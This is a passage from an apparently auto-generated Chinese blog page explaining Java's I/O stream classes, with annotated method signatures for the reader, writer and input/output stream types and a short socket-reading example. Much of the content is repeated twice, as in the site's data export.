字符缓冲流，高效的从字符流中读取文不。<br><br>FileReader 和 FileWriter 为 InputStreamReader 和 OutputStreamWriter 的子类，特意用来读写文件。<br></p>\n<p>字节流:</p>\n<p>InputStream 和 OutputStream 为字节流抽象基类，抽象基本方法。<br><br>FileInputStream 和 FileOutputStream 为文件字节流，读写文件原始字节。<br><br>BufferdInputStream 和 BufferdOutputStream 为字节缓冲流，利用缓冲区，提高读写效率。<br></p>\n<h3 id=\"二-具体方法\"><a href=\"#二-具体方法\" class=\"headerlink\" title=\"二.具体方法\"></a>二.具体方法</h3><h4 id=\"1-字符流\"><a href=\"#1-字符流\" class=\"headerlink\" title=\"1.字符流\"></a>1.字符流</h4><p>Reader:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public abstract class Reader implements Readable, Closeable &#123;</span><br><span class=\"line\">    //将字符读入缓冲区</span><br><span class=\"line\">    public int read(java.nio.CharBuffer target)</span><br><span class=\"line\">    //读取字符(单个)</span><br><span class=\"line\">    public int read()</span><br><span class=\"line\">    //将字符读入数组</span><br><span class=\"line\">    public int read(char cbuf[])</span><br><span class=\"line\">    //将字符读入数组某个部分</span><br><span class=\"line\">    abstract public int read(char cbuf[], int off, int len)</span><br><span class=\"line\">    //跳过某些字符</span><br><span class=\"line\">    public long skip(long n)</span><br><span class=\"line\">    //是否准备好读取</span><br><span class=\"line\">    public boolean ready()</span><br><span class=\"line\">    //是否支持mark操作</span><br><span class=\"line\">    public boolean markSupported() &#123;...&#125;</span><br><span class=\"line\">    //mark</span><br><span class=\"line\">    public void mark(int readAheadLimit)</span><br><span class=\"line\">    //重置流</span><br><span class=\"line\">    public void reset()</span><br><span class=\"line\">    //关闭</span><br><span class=\"line\">    abstract public void close() throws IOException;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>InputStreamReader:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class InputStreamReader extends Reader &#123;</span><br><span class=\"line\">    //构造方法,默认/字符集名称/字符集/字符集解码器</span><br><span class=\"line\">    public InputStreamReader(InputStream in)</span><br><span class=\"line\">    public InputStreamReader(InputStream in, String charsetName)</span><br><span class=\"line\">    public InputStreamReader(InputStream in, Charset cs)</span><br><span class=\"line\">    public InputStreamReader(InputStream in, CharsetDecoder dec)</span><br><span class=\"line\">    //扩展方法</span><br><span class=\"line\">    public String getEncoding()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BufferdReader:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class BufferedReader extends Reader &#123;</span><br><span class=\"line\">    //构造器，默认/自定义buffer大小</span><br><span class=\"line\">    public BufferedReader(Reader in)</span><br><span class=\"line\">    public BufferedReader(Reader in, int sz)</span><br><span class=\"line\">    //特有方法</span><br><span class=\"line\">    //确保流未被关闭</span><br><span class=\"line\">    private void ensureOpen()</span><br><span class=\"line\">    //读取一行</span><br><span class=\"line\">    public String readLine()</span><br><span class=\"line\">    //以流的形式返回一行</span><br><span class=\"line\">    public Stream&lt;String&gt; lines()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>FileReader:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class FileReader extends InputStreamReader &#123;</span><br><span class=\"line\">    //构造方法</span><br><span class=\"line\">    public FileReader(String fileName)</span><br><span class=\"line\">    public FileReader(File file)</span><br><span class=\"line\">    public FileReader(FileDescriptor fd)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Writer:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public abstract class Writer implements Appendable, Closeable, Flushable &#123;</span><br><span class=\"line\">    //写入单个字符</span><br><span class=\"line\">    public void write(int c)</span><br><span class=\"line\">    //写入数组内所有字符</span><br><span class=\"line\">    public void write(char cbuf[])</span><br><span class=\"line\">    //写入一部分</span><br><span class=\"line\">    abstract public void write(char cbuf[], int off, int len)</span><br><span class=\"line\">    //写字符串</span><br><span class=\"line\">    public void write(String str)</span><br><span class=\"line\">    public void write(String str, int off, int len)</span><br><span class=\"line\">    //追加字符序列</span><br><span class=\"line\">    public Writer append(CharSequence csq)</span><br><span class=\"line\">    public Writer append(CharSequence csq, int start, int end)</span><br><span class=\"line\">    //追究字符</span><br><span class=\"line\">    public Writer append(char c)</span><br><span class=\"line\">    //刷新整个流</span><br><span class=\"line\">    abstract public void flush()</span><br><span class=\"line\">    //关闭</span><br><span class=\"line\">    abstract public void close()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>OutputStreamWriter:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class OutputStreamWriter extends Writer &#123;</span><br><span class=\"line\">    //构造方法，默认/字符集名/字符集/字符集编码器</span><br><span class=\"line\">    public OutputStreamWriter(OutputStream out)</span><br><span class=\"line\">    public OutputStreamWriter(OutputStream out, String charsetName)</span><br><span class=\"line\">    public OutputStreamWriter(OutputStream out, Charset cs)</span><br><span class=\"line\">    public OutputStreamWriter(OutputStream out, CharsetEncoder enc)</span><br><span class=\"line\">    //特有方法</span><br><span class=\"line\">    public String getEncoding()</span><br><span class=\"line\">    //刷新buffer</span><br><span class=\"line\">    void flushBuffer()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BufferdWriter:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class BufferedWriter extends Writer &#123;</span><br><span class=\"line\">    //构造器，默认大小/缓冲区大小</span><br><span class=\"line\">    public BufferedWriter(Writer out)</span><br><span class=\"line\">    public BufferedWriter(Writer out, int sz)</span><br><span class=\"line\">    //特有</span><br><span class=\"line\">    //换行</span><br><span class=\"line\">    public void newLine()</span><br><span class=\"line\">    //刷新缓冲区  </span><br><span class=\"line\">    void flushBuffer()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>FileWriter:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class FileWriter extends OutputStreamWriter&#123;</span><br><span class=\"line\">    //构造器</span><br><span class=\"line\">    public FileWriter(String fileName)</span><br><span class=\"line\">    //是否追加的方式写入文件</span><br><span class=\"line\">    public FileWriter(String fileName, boolean append)</span><br><span class=\"line\">    public FileWriter(File file)</span><br><span class=\"line\">    public FileWriter(FileDescriptor fd)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-字节流\"><a href=\"#2-字节流\" class=\"headerlink\" title=\"2.字节流\"></a>2.字节流</h4><p>InputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public abstract class InputStream implements Closeable &#123;</span><br><span class=\"line\">    //从输入流中读取下一个字节byte</span><br><span class=\"line\">    public abstract int read()</span><br><span class=\"line\">    //从输入流中读取一定数量字节到数组中</span><br><span class=\"line\">    public int read(byte b[])</span><br><span class=\"line\">    //读取输入流中len个字节</span><br><span class=\"line\">    public int read(byte b[], int off, int len)</span><br><span class=\"line\">    //跳过</span><br><span class=\"line\">    public long skip(long n)</span><br><span class=\"line\">    //输入流是否可读取</span><br><span class=\"line\">    public int available()</span><br><span class=\"line\">    //关闭</span><br><span class=\"line\">    public void close()</span><br><span class=\"line\">    //是否支持reset方法</span><br><span class=\"line\">    public boolean markSupported()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>FileInputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class FileInputStream extends InputStream&#123;</span><br><span class=\"line\">    //构造器</span><br><span class=\"line\">    public FileInputStream(String name)</span><br><span class=\"line\">    public FileInputStream(File file)</span><br><span class=\"line\">    public FileInputStream(FileDescriptor fdObj)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BufferdInputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class BufferedInputStream extends FilterInputStream &#123;</span><br><span class=\"line\">    //构造器</span><br><span class=\"line\">    public BufferedInputStream(InputStream in)</span><br><span class=\"line\">    public BufferedInputStream(InputStream in, int size)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>OutputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public abstract class OutputStream implements Closeable, Flushable&#123;</span><br><span class=\"line\">    //写入</span><br><span class=\"line\">    public abstract void write(int b)</span><br><span class=\"line\">    //将数组内的字符写入</span><br><span class=\"line\">    public void write(byte b[])</span><br><span class=\"line\">    //将数组内特定部分字符写入</span><br><span class=\"line\">    public void write(byte b[], int off, int len)</span><br><span class=\"line\">    //刷新</span><br><span class=\"line\">    public void flush()</span><br><span class=\"line\">    //关闭</span><br><span class=\"line\">    public void close()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>FileOutputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class FileOutputStream extends OutputStream&#123;</span><br><span class=\"line\">    //构造器</span><br><span class=\"line\">    public FileOutputStream(String name)</span><br><span class=\"line\">    public FileOutputStream(String name, boolean append)</span><br><span class=\"line\">    public FileOutputStream(File file)</span><br><span class=\"line\">    public FileOutputStream(File file, boolean append)</span><br><span class=\"line\">    public FileOutputStream(FileDescriptor fdObj)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BufferdOutputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class BufferedOutputStream extends FilterOutputStream &#123;</span><br><span class=\"line\">    //构造器</span><br><span class=\"line\">    public BufferedOutputStream(OutputStream out)</span><br><span class=\"line\">    public BufferedOutputStream(OutputStream out, int size)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"三-实际例子\"><a href=\"#三-实际例子\" class=\"headerlink\" title=\"三.实际例子\"></a>三.实际例子</h3><p>读取socket发送过来的字节流</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.客户端发过来的字节流 socket.getInputStream()</span><br><span class=\"line\">//2.字节流转为字符流 InputStreamReader()</span><br><span class=\"line\">//3.高效读写 BufferedReader()</span><br><span class=\"line\">BufferedReader in = new BufferedReader(new InputStreamReader(</span><br><span class=\"line\">socket.getInputStream()));</span><br><span class=\"line\">System.out.println(in.readLine());  // 打印</span><br></pre></td></tr></table></figure>\n<h3 id=\"四-区别\"><a href=\"#四-区别\" class=\"headerlink\" title=\"四.区别\"></a>四.区别</h3><p><a href=\"https://comp.lang.java.help.narkive.com/dKrnNGj0/what-s-the-diff-printwriter-vs-outputstreamwriter\" target=\"_blank\" rel=\"noopener\">https://comp.lang.java.help.narkive.com/dKrnNGj0/what-s-the-diff-printwriter-vs-outputstreamwriter</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一-整体概念\"><a href=\"#一-整体概念\" class=\"headerlink\" title=\"一.整体概念\"></a>一.整体概念</h3><p>Java.io 包含几乎所有的java的输入输出类</p>\n<p>先来一张 <a href=\"http://www.runoob.com/java/java-files-io.html\" target=\"_blank\" rel=\"noopener\">菜鸟教程</a> 的图片<br><br><img src=\"http://67.216.218.49:8000/file/blogs/java/io/iostream.png\" alt=\"io\"></p>\n<p>再来一张 <a href=\"http://www.runoob.com/java/java-files-io.html\" target=\"_blank\" rel=\"noopener\">csdn</a> (推荐，写得很好)简化的图片<br><br><img src=\"http://67.216.218.49:8000/file/blogs/java/io/iostream2.png\" alt=\"io2\"></p>\n<p>java中io流分字节流与字符流两种。</p>\n<p>字符流:</p>\n<p>Reader 和 Writer 为字符流抽象基类，提供基本抽象方法。<br><br>InputStreamReader 和 OutputStreamWriter 为字符转换流，目的是将字节流转化为字符流。<br><br>BufferdReader 和 BufferdWriter 字符缓冲流，高效的从字符流中读取文不。<br><br>FileReader 和 FileWriter 为 InputStreamReader 和 OutputStreamWriter 的子类，特意用来读写文件。<br></p>\n<p>字节流:</p>\n<p>InputStream 和 OutputStream 为字节流抽象基类，抽象基本方法。<br><br>FileInputStream 和 FileOutputStream 为文件字节流，读写文件原始字节。<br><br>BufferdInputStream 和 BufferdOutputStream 为字节缓冲流，利用缓冲区，提高读写效率。<br></p>\n<h3 id=\"二-具体方法\"><a href=\"#二-具体方法\" class=\"headerlink\" title=\"二.具体方法\"></a>二.具体方法</h3><h4 id=\"1-字符流\"><a href=\"#1-字符流\" class=\"headerlink\" title=\"1.字符流\"></a>1.字符流</h4><p>Reader:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public abstract class Reader implements Readable, Closeable &#123;</span><br><span class=\"line\">    //将字符读入缓冲区</span><br><span class=\"line\">    public int read(java.nio.CharBuffer target)</span><br><span class=\"line\">    //读取字符(单个)</span><br><span class=\"line\">    public int read()</span><br><span class=\"line\">    //将字符读入数组</span><br><span class=\"line\">    public int read(char cbuf[])</span><br><span class=\"line\">    //将字符读入数组某个部分</span><br><span class=\"line\">    abstract public int read(char cbuf[], int off, int len)</span><br><span class=\"line\">    //跳过某些字符</span><br><span class=\"line\">    public long skip(long n)</span><br><span class=\"line\">    //是否准备好读取</span><br><span class=\"line\">    public boolean ready()</span><br><span class=\"line\">    //是否支持mark操作</span><br><span class=\"line\">    public boolean markSupported() &#123;...&#125;</span><br><span class=\"line\">    //mark</span><br><span class=\"line\">    public void mark(int readAheadLimit)</span><br><span class=\"line\">    //重置流</span><br><span class=\"line\">    public void reset()</span><br><span class=\"line\">    //关闭</span><br><span class=\"line\">    abstract public void close() throws IOException;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>InputStreamReader:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class InputStreamReader extends Reader &#123;</span><br><span class=\"line\">    //构造方法,默认/字符集名称/字符集/字符集解码器</span><br><span class=\"line\">    public InputStreamReader(InputStream in)</span><br><span class=\"line\">    public InputStreamReader(InputStream in, String charsetName)</span><br><span class=\"line\">    public InputStreamReader(InputStream in, Charset cs)</span><br><span class=\"line\">    public InputStreamReader(InputStream in, CharsetDecoder dec)</span><br><span class=\"line\">    //扩展方法</span><br><span class=\"line\">    public String getEncoding()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BufferdReader:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class BufferedReader extends Reader &#123;</span><br><span class=\"line\">    //构造器，默认/自定义buffer大小</span><br><span class=\"line\">    public BufferedReader(Reader in)</span><br><span class=\"line\">    public BufferedReader(Reader in, int sz)</span><br><span class=\"line\">    //特有方法</span><br><span class=\"line\">    //确保流未被关闭</span><br><span class=\"line\">    private void ensureOpen()</span><br><span class=\"line\">    //读取一行</span><br><span class=\"line\">    public String readLine()</span><br><span class=\"line\">    //以流的形式返回一行</span><br><span class=\"line\">    public Stream&lt;String&gt; lines()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>FileReader:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class FileReader extends InputStreamReader &#123;</span><br><span class=\"line\">    //构造方法</span><br><span class=\"line\">    public FileReader(String fileName)</span><br><span class=\"line\">    public FileReader(File file)</span><br><span class=\"line\">    public FileReader(FileDescriptor fd)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Writer:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public abstract class Writer implements Appendable, Closeable, Flushable &#123;</span><br><span class=\"line\">    //写入单个字符</span><br><span class=\"line\">    public void write(int c)</span><br><span class=\"line\">    //写入数组内所有字符</span><br><span class=\"line\">    public void write(char cbuf[])</span><br><span class=\"line\">    //写入一部分</span><br><span class=\"line\">    abstract public void write(char cbuf[], int off, int len)</span><br><span class=\"line\">    //写字符串</span><br><span class=\"line\">    public void write(String str)</span><br><span class=\"line\">    public void write(String str, int off, int len)</span><br><span class=\"line\">    //追加字符序列</span><br><span class=\"line\">    public Writer append(CharSequence csq)</span><br><span class=\"line\">    public Writer append(CharSequence csq, int start, int end)</span><br><span class=\"line\">    //追究字符</span><br><span class=\"line\">    public Writer append(char c)</span><br><span class=\"line\">    //刷新整个流</span><br><span class=\"line\">    abstract public void flush()</span><br><span class=\"line\">    //关闭</span><br><span class=\"line\">    abstract public void close()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>OutputStreamWriter:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class OutputStreamWriter extends Writer &#123;</span><br><span class=\"line\">    //构造方法，默认/字符集名/字符集/字符集编码器</span><br><span class=\"line\">    public OutputStreamWriter(OutputStream out)</span><br><span class=\"line\">    public OutputStreamWriter(OutputStream out, String charsetName)</span><br><span class=\"line\">    public OutputStreamWriter(OutputStream out, Charset cs)</span><br><span class=\"line\">    public OutputStreamWriter(OutputStream out, CharsetEncoder enc)</span><br><span class=\"line\">    //特有方法</span><br><span class=\"line\">    public String getEncoding()</span><br><span class=\"line\">    //刷新buffer</span><br><span class=\"line\">    void flushBuffer()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BufferdWriter:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class BufferedWriter extends Writer &#123;</span><br><span class=\"line\">    //构造器，默认大小/缓冲区大小</span><br><span class=\"line\">    public BufferedWriter(Writer out)</span><br><span class=\"line\">    public BufferedWriter(Writer out, int sz)</span><br><span class=\"line\">    //特有</span><br><span class=\"line\">    //换行</span><br><span class=\"line\">    public void newLine()</span><br><span class=\"line\">    //刷新缓冲区  </span><br><span class=\"line\">    void flushBuffer()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>FileWriter:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class FileWriter extends OutputStreamWriter&#123;</span><br><span class=\"line\">    //构造器</span><br><span class=\"line\">    public FileWriter(String fileName)</span><br><span class=\"line\">    //是否追加的方式写入文件</span><br><span class=\"line\">    public FileWriter(String fileName, boolean append)</span><br><span class=\"line\">    public FileWriter(File file)</span><br><span class=\"line\">    public FileWriter(FileDescriptor fd)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-字节流\"><a href=\"#2-字节流\" class=\"headerlink\" title=\"2.字节流\"></a>2.字节流</h4><p>InputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public abstract class InputStream implements Closeable &#123;</span><br><span class=\"line\">    //从输入流中读取下一个字节byte</span><br><span class=\"line\">    public abstract int read()</span><br><span class=\"line\">    //从输入流中读取一定数量字节到数组中</span><br><span class=\"line\">    public int read(byte b[])</span><br><span class=\"line\">    //读取输入流中len个字节</span><br><span class=\"line\">    public int read(byte b[], int off, int len)</span><br><span class=\"line\">    //跳过</span><br><span class=\"line\">    public long skip(long n)</span><br><span class=\"line\">    //输入流是否可读取</span><br><span class=\"line\">    public int available()</span><br><span class=\"line\">    //关闭</span><br><span class=\"line\">    public void close()</span><br><span class=\"line\">    //是否支持reset方法</span><br><span class=\"line\">    public boolean markSupported()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>FileInputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class FileInputStream extends InputStream&#123;</span><br><span class=\"line\">    //构造器</span><br><span class=\"line\">    public FileInputStream(String name)</span><br><span class=\"line\">    public FileInputStream(File file)</span><br><span class=\"line\">    public FileInputStream(FileDescriptor fdObj)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BufferdInputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class BufferedInputStream extends FilterInputStream &#123;</span><br><span class=\"line\">    //构造器</span><br><span class=\"line\">    public BufferedInputStream(InputStream in)</span><br><span class=\"line\">    public BufferedInputStream(InputStream in, int size)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>OutputStream:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public abstract class OutputStream implements Closeable, Flushable&#123;</span><br><span class=\"line\">    //写入</span><br><span class=\"line\">    